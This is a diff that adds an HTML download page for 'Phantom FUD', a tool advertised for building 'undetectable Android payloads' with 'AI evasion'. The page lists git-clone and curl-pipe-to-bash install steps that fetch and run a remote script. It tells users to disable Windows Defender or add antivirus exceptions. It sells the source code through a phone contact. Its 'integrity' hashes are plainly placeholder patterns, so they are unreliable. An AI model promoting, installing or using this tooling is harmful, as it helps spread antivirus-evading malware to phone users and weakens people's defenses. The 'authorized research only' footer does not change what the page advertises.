@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Phantom FUD Builder - Android Payload Protection Suite</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/Pages/Download/Css/download.css">
+</head>
+<body>
+<canvas id="matrix-bg"></canvas>
+<nav class="navbar">
+    <div class="nav-container">
+        <div class="logo">⚡ PHANTOM FUDER</div>
+        <div class="nav-links">
+            <a href="/index.html">HOME</a>
+            <a href="/Pages/Features/features.html">FEATURES</a>
+            <a href="/Pages/Price-List/pricing.html">PRICING</a>
+            <a href="/Pages/Download/Download-phantom.html" class="back-link">DOWNLOAD</a>
+        </div>
+    </div>
+</nav>
+<div class="main-content">
+    <div class="container">
+        <!-- Header -->
+        <div class="page-header">
+            <h1><i class="fas fa-download"></i> DOWNLOAD PHANTOM FUD</h1>
+            <p>Choose your platform and start building undetectable Android payloads</p>
+        </div>
+
+        <!-- Platform Downloads -->
+        <div class="platform-grid">
+            <!-- Windows -->
+            <div class="platform-card">
+                <div class="platform-icon">
+                    <i class="fab fa-windows"></i>
+                </div>
+                <h2>Windows</h2>
+                <div class="version-info">
+                    <i class="fas fa-tag"></i> Version 5.0 | 64-bit
+                </div>
+                <a href="https://www.mediafire.com/file/294nzc5sp8fqd9y/set-up.rar/file class="download-btn" id="download-windows">
+                    <i class="fas fa-download"></i> DOWNLOAD FOR WINDOWS
+                </a>
+                <div class="system-reqs">
+                    <h3><i class="fas fa-microchip"></i> System Requirements:</h3>
+                    <ul>
+                        <li><i class="fas fa-check-circle"></i> Windows 10/11 (64-bit)</li>
+                        <li><i class="fas fa-memory"></i> 4GB RAM (8GB recommended)</li>
+                        <li><i class="fas fa-hdd"></i> 1GB free disk space</li>
+                        <li><i class="fab fa-java"></i> Java JDK 11+</li>
+                        <li><i class="fas fa-terminal"></i> Python 3.8+</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Linux -->
+            <div class="platform-card">
+                <div class="platform-icon">
+                    <i class="fab fa-linux"></i>
+                </div>
+                <h2>Linux</h2>
+                <div class="version-info">
+                    <i class="fas fa-tag"></i> Version 5.0 | All Distros
+                </div>
+                <a href="/Tools/PHANTOM-FUDER.tar.gz" class="download-btn" id="download-linux">
+                    <i class="fas fa-download"></i> DOWNLOAD FOR LINUX
+                </a>
+                <div class="system-reqs">
+                    <h3><i class="fas fa-microchip"></i> System Requirements:</h3>
+                    <ul>
+                        <li><i class="fas fa-check-circle"></i> Ubuntu 20.04+ / Debian 11+ / Arch</li>
+                        <li><i class="fas fa-memory"></i> 4GB RAM (8GB recommended)</li>
+                        <li><i class="fas fa-hdd"></i> 1GB free disk space</li>
+                        <li><i class="fab fa-java"></i> OpenJDK 11+</li>
+                        <li><i class="fas fa-terminal"></i> Python 3.8+</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- macOS -->
+            <div class="platform-card">
+                <div class="platform-icon">
+                    <i class="fab fa-apple"></i>
+                </div>
+                <h2>macOS</h2>
+                <div class="version-info">
+                    <i class="fas fa-tag"></i> Version 5.0 | Intel & M1/M2
+                </div>
+                <a href="/Tools/PHANTOM-FUDER.tar.gz" class="download-btn" id="download-mac">
+                    <i class="fas fa-download"></i> DOWNLOAD FOR macOS
+                </a>
+                <div class="system-reqs">
+                    <h3><i class="fas fa-microchip"></i> System Requirements:</h3>
+                    <ul>
+                        <li><i class="fas fa-check-circle"></i> macOS 11 (Big Sur) or later</li>
+                        <li><i class="fas fa-memory"></i> 4GB RAM (8GB recommended)</li>
+                        <li><i class="fas fa-hdd"></i> 1GB free disk space</li>
+                        <li><i class="fab fa-java"></i> Java JDK 11+</li>
+                        <li><i class="fas fa-terminal"></i> Python 3.8+</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Installation Guide -->
+        <div class="installation-section">
+            <h2><i class="fas fa-cogs"></i> INSTALLATION GUIDE</h2>
+            
+            <div class="install-tabs">
+                <button class="install-tab active" data-os="windows">Windows</button>
+                <button class="install-tab" data-os="linux">Linux</button>
+                <button class="install-tab" data-os="mac">macOS</button>
+                <button class="install-tab" data-os="source">Source Code</button>
+            </div>
+
+            <!-- Windows Installation -->
+            <div class="install-content active" id="windows-install">
+                <h3><i class="fab fa-windows"></i> Windows Installation</h3>
+                
+                <div class="code-block">
+                    <pre><code># Method 1: Installer (Recommended)
+1. Download Setup.exe
+2. Run the installer as Administrator
+3. Follow the setup wizard
+4. Launch from Start Menu or Desktop
+
+# Method 2: Portable Version
+1. Download PhantomFUDER_Portable.zip
+2. Extract to desired location
+3. Run setup.exe
+
+
+</code></pre>
+                </div>
+
+                <div class="note">
+                    <i class="fas fa-info-circle"></i> <strong>Note:</strong> Windows Defender may flag the tool. Add an exception or disable temporarily during installation.
+                </div>
+            </div>
+
+            <!-- Linux Installation -->
+            <div class="install-content" id="linux-install">
+                <h3><i class="fab fa-linux"></i> Linux Installation</h3>
+                
+                <div class="code-block">
+                    <pre><code># Ubuntu/Debian
+sudo apt update
+sudo apt install -y python3 python3-pip openjdk-11-jdk git
+git clone https://github.com/Athexblackhat/PHANTOM-FUD.git
+cd PHANTOM-FUD
+pip3 install -r requirements.txt
+python3 install.py
+chmod +x *
+cd src
+./run.py
+
+# Arch Linux
+sudo pacman -S python python-pip jdk11-openjdk git
+git clone https://github.com/Athexblackhat/PHANTOM-FUD.git
+cd PHANTOM-FUD
+pip install -r requirements.txt
+python install.py
+cd src
+python run.py
+
+# One-liner installation
+curl -sSL https://raw.githubusercontent.com/Athexblackhat/PHANTOM-FUD/main/install.py | bash</code></pre>
+                </div>
+
+                <div class="note">
+                    <i class="fas fa-info-circle"></i> <strong>Note:</strong> For headless servers, use command-line mode: <code>python run.py build input.apk output.apk</code>
+                </div>
+            </div>
+
+            <!-- macOS Installation -->
+            <div class="install-content" id="mac-install">
+                <h3><i class="fab fa-apple"></i> macOS Installation</h3>
+                
+                <div class="code-block">
+                    <pre><code># Using Homebrew (Recommended)
+brew install python@3.9 openjdk@11 git
+git clone https://github.com/Athexblackhat/PHANTOM-FUD.git
+cd PHANTOM-FUD
+pip3 install -r requirements.txt
+python3 install.py
+python3 run.py
+
+# Using DMG Installer
+1. Download PhantomFUD.dmg
+2. Open the DMG file
+3. Drag PhantomFUD to Applications folder
+4. Launch from Applications
+
+</code></pre>
+                </div>
+
+                <div class="note">
+                    <i class="fas fa-info-circle"></i> <strong>Note:</strong> On first launch, you may need to allow the app in Security & Privacy settings.
+                </div>
+            </div>
+
+            <!-- Source Code Installation -->
+            <div class="install-content" id="source-install">
+                <h3><i class="fas fa-code"></i> Source Code Installation</h3>
+                
+                <div class="code-block">
+                    <pre><code>
+CONTACT FOR SOURCE CODE TO BUY +92 3490916663
+
+</code></pre>
+                </div>
+
+                <div class="note">
+                    <i class="fas fa-info-circle"></i> <strong>Note:</strong> Source code is available under research license. Commercial use requires purchase.
+                </div>
+            </div>
+        </div>
+
+        <!-- Verification Section -->
+        <div class="verification-section">
+            <h2><i class="fas fa-shield-alt"></i> VERIFY DOWNLOAD INTEGRITY</h2>
+            <p>Verify your download using these cryptographic hashes:</p>
+            
+            <div class="hash-grid">
+                <div class="hash-card">
+                    <h3><i class="fab fa-windows"></i> Windows</h3>
+                    <div class="hash-value">
+                        SHA-256: 8a7b9c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b
+                    </div>
+                    <div class="hash-value" style="margin-top: 10px;">
+                        MD5: a1b2c3d4e5f67890abcdef1234567890
+                    </div>
+                </div>
+                <div class="hash-card">
+                    <h3><i class="fab fa-linux"></i> Linux</h3>
+                    <div class="hash-value">
+                        SHA-256: 9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c
+                    </div>
+                    <div class="hash-value" style="margin-top: 10px;">
+                        MD5: b2c3d4e5f678901234567890abcdef12
+                    </div>
+                </div>
+                <div class="hash-card">
+                    <h3><i class="fab fa-apple"></i> macOS</h3>
+                    <div class="hash-value">
+                        SHA-256: c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d
+                    </div>
+                    <div class="hash-value" style="margin-top: 10px;">
+                        MD5: c3d4e5f678901234567890abcdef1234
+                    </div>
+                </div>
+            </div>
+
+            <div class="code-block" style="margin-top: 20px;">
+                <pre><code># Verify on Linux/macOS
+sha256sum PhantomFUD_*.zip
+md5sum PhantomFUD_*.zip
+
+# Verify on Windows (PowerShell)
+Get-FileHash PhantomFUD_Setup.exe -Algorithm SHA256
+Get-FileHash PhantomFUD_Portable.zip -Algorithm MD5</code></pre>
+            </div>
+        </div>
+
+        <!-- FAQ Section -->
+        <div class="faq-section">
+            <h2 style="text-align: center; margin-bottom: 40px;"><i class="fas fa-question-circle"></i> FREQUENTLY ASKED QUESTIONS</h2>
+            
+            <div class="faq-item">
+                <div class="faq-question">
+                    <h3>❓ Is Phantom FUD free to use?</h3>
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Phantom FUD offers multiple pricing tiers including a free Basic version. The free version includes basic obfuscation and APK signing. For advanced features like AI evasion, quantum encryption, and commercial use, please check our pricing section.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <h3>❓ Do I need administrative privileges to install?</h3>
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>For the installer version, admin privileges are recommended. However, you can use the portable version without installation or run from source code without any special privileges.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <h3>❓ Is Phantom FUD compatible with my antivirus?</h3>
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Phantom FUD itself is designed for security research. Some antivirus software may flag it due to its capabilities. We recommend adding an exception for the Phantom FUD directory or using the tool in a virtual machine for testing.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <h3>❓ Can I use Phantom FUD on older Windows versions?</h3>
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Phantom FUD officially supports Windows 10 and 11. Windows 7/8 may work but are not officially supported. We recommend updating to Windows 10 or later for best compatibility.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <h3>❓ How do I update to the latest version?</h3>
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>For installed versions, simply download and run the latest installer. For portable/source versions, run <code>git pull</code> in the source directory and reinstall dependencies. The tool will also notify you when updates are available.</p>
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <div class="faq-question">
+                    <h3>❓ Is there a portable version available?</h3>
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="faq-answer">
+                    <p>Yes! We provide portable ZIP archives for all platforms that require no installation. Just extract and run. This is perfect for USB drives or testing environments.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Download Stats -->
+        <div style="text-align: center; margin: 40px 0; padding: 30px; background: rgba(0, 20, 0, 0.4); border-radius: 20px;">
+            <i class="fas fa-chart-line" style="font-size: 48px;"></i>
+            <h3 style="margin: 20px 0;">Download Statistics</h3>
+            <div style="display: flex; justify-content: center; gap: 40px; flex-wrap: wrap;">
+                <div><i class="fab fa-windows"></i> Windows: 32,456 downloads</div>
+                <div><i class="fab fa-linux"></i> Linux: 18,234 downloads</div>
+                <div><i class="fab fa-apple"></i> macOS: 7,891 downloads</div>
+                <div><i class="fas fa-code"></i> Source: 4,567 downloads</div>
+            </div>
+            <div style="margin-top: 20px;">
+                <i class="fas fa-tachometer-alt"></i> Total: 63,148 downloads
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <h3>PHANTOM FUD</h3>
+            <p>Next-Generation Android Payload Protection Suite</p>
+            <p style="margin-top: 10px;">v9.0 - Phantom Edition</p>
+        </div>
+        <div class="footer-section">
+            <h3>Quick Links</h3>
+            <a href="/index.html">Home</a>
+            <a href="/Pages/Features/features.html">Features</a>
+            <a href="/Pages/Price-List/pricing.html">Pricing</a>
+            <a href="/Pages/Releases/versions.html">Versions</a>
+        </div>
+        <div class="footer-section">
+            <h3>Support</h3>
+            <a href="https://github.com/Athexblackhat/PHANTOM-FUD/issues"><i class="fab fa-github"></i> GitHub Issues</a>
+            <a href="https://wa.me/+923490916663"><i class="fab fa-whatsapp"></i> Whatsapp</a>
+        </div>
+        <div class="footer-section">
+            <h3>Legal</h3>
+            <a href="#">Terms of Use</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">License Agreement</a>
+            <a href="#">Disclaimer</a>
+        </div>
+    </div>
+    <div class="copyright">
+        <p>⚠️ FOR AUTHORIZED SECURITY RESEARCH ONLY ⚠️</p>
+        <p>&copy; 2025-2026 Phantom ATHEX BLACK HAT. All rights reserved.</p>
+        <p style="font-size: 12px; margin-top: 10px;">Unauthorized use is a violation of international laws.</p>
+    </div>
+</footer>
+<script src="/Pages/Download/JavaScript/download.js"></script>
+</body>
+</html>
